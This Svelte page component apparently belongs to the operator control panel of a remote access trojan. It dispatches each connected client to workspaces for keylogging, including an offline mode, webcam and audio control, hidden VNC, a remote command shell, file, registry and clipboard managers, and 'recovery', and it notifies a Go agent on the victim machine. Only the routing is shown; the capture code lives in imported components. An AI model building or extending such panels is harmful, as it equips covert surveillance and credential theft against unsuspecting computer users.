<script lang="ts">
	import {
		Card,
		CardContent,
		CardDescription,
		CardHeader,
		CardTitle
	} from '$lib/components/ui/card/index.js';
	import { browser } from '$app/environment';
	import { onMount } from 'svelte';
	import { type ClientToolId } from '$lib/data/client-tools';
	import { notifyToolActivationCommand } from '$lib/utils/agent-commands.js';
	import type { PageData } from './$types';
	import AppVncWorkspace from '$lib/components/workspace/tools/app-vnc-workspace.svelte';
	import WebcamControlWorkspace from '$lib/components/workspace/tools/webcam-control-workspace.svelte';
	import AudioControlWorkspace from '$lib/components/workspace/tools/audio-control-workspace.svelte';
	import KeyloggerWorkspace from '$lib/components/workspace/tools/keylogger-workspace.svelte';
	import CmdWorkspace from '$lib/components/workspace/tools/cmd-workspace.svelte';
	import FileManagerWorkspace from '$lib/components/workspace/tools/file-manager-workspace.svelte';
	import SystemMonitorWorkspace from '$lib/components/workspace/tools/system-monitor-workspace.svelte';
	import RegistryManagerWorkspace from '$lib/components/workspace/tools/registry-manager-workspace.svelte';
	import ClipboardManagerWorkspace from '$lib/components/workspace/tools/clipboard-manager-workspace.svelte';
	import RecoveryWorkspace from '$lib/components/workspace/tools/recovery-workspace.svelte';
	import OptionsWorkspace from '$lib/components/workspace/tools/options-workspace.svelte';
	import OpenUrlWorkspace from '$lib/components/workspace/tools/open-url-workspace.svelte';
	import ClientChatWorkspace from '$lib/components/workspace/tools/client-chat-workspace.svelte';
	import TriggerMonitorWorkspace from '$lib/components/workspace/tools/trigger-monitor-workspace.svelte';
	import IpGeolocationWorkspace from '$lib/components/workspace/tools/ip-geolocation-workspace.svelte';
	import EnvironmentVariablesWorkspace from '$lib/components/workspace/tools/environment-variables-workspace.svelte';

	let { data } = $props<{ data: PageData }>();
	const client = $derived(data.client);
	const agent = $derived(data.agent);
	const tool = $derived(data.tool);
	const segments = $derived(data.segments);

	const componentMap = {
		'app-vnc': AppVncWorkspace,
		'webcam-control': WebcamControlWorkspace,
		'audio-control': AudioControlWorkspace,
		'file-manager': FileManagerWorkspace,
		'system-monitor': SystemMonitorWorkspace,
		'registry-manager': RegistryManagerWorkspace,
		'clipboard-manager': ClipboardManagerWorkspace,
		recovery: RecoveryWorkspace,
		options: OptionsWorkspace,
		'open-url': OpenUrlWorkspace,
		'client-chat': ClientChatWorkspace,
		'trigger-monitor': TriggerMonitorWorkspace,
		'ip-geolocation': IpGeolocationWorkspace,
		'environment-variables': EnvironmentVariablesWorkspace
	} as const;

	const keyloggerModes = {
		'keylogger-standard': 'standard',
		'keylogger-offline': 'offline'
	} as const;

	const activeComponent = $derived(componentMap[tool.id as keyof typeof componentMap]);
	const keyloggerMode = $derived(keyloggerModes[tool.id as keyof typeof keyloggerModes]);

	onMount(() => {
		if (!browser) {
			return;
		}

		notifyToolActivationCommand(client.id, tool.id as ClientToolId, {
			action: 'open',
			metadata: { surface: 'workspace' }
		});

		return () => {
			notifyToolActivationCommand(client.id, tool.id as ClientToolId, {
				action: 'close',
				metadata: { surface: 'workspace' }
			});
		};
	});
</script>

<div class="space-y-6">
	{#if keyloggerMode}
		<KeyloggerWorkspace {client} mode={keyloggerMode} />
	{:else if tool.id === 'cmd'}
		<CmdWorkspace {client} {agent} />
	{:else if activeComponent}
		{@const Workspace = activeComponent}
		<Workspace {client} />
	{:else}
		<Card>
			<CardHeader>
				<CardTitle>{tool.title}</CardTitle>
				<CardDescription>{tool.description}</CardDescription>
			</CardHeader>
			<CardContent class="space-y-4 text-sm text-slate-600 dark:text-slate-400">
				<p>
					modules / {segments.join(' / ')} is currently using the default planning workspace. Define
					the implementation contract here before wiring it to the Go agent.
				</p>
				<p>
					Add a dedicated workspace component for <span class="font-medium">{tool.title}</span> to elevate
					the operator experience when you are ready.
				</p>
			</CardContent>
		</Card>
	{/if}
</div>
